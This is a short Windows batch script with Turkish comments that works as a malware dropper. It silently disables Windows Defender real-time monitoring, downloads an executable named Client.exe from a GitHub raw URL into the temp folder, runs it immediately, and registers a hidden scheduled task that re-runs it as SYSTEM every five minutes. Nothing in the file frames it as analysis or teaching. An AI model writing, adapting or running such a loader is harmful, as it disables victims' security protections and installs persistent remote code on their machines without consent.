@echo off
set "filename=Client.exe"
set "filepath=%TEMP%\%filename%"
set "url=https://github.com/tazerno/test/raw/refs/heads/main/%filename%"

:: Defender'ı devre dışı bırak (başarısız olsa da devam eder)
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}"

:: Dosyayı indir
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
"Invoke-WebRequest -Uri '%url%' -OutFile '%filepath%'"

:: Dosyayı anında çalıştır
start "" "%filepath%"

:: Zamanlanmış görev oluştur (her 5 dakikada bir çalıştıracak)
schtasks /create /f /sc minute /mo 5 /tn "ClientTask" ^
/tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%filepath%\"" ^
/rl HIGHEST /ru SYSTEM
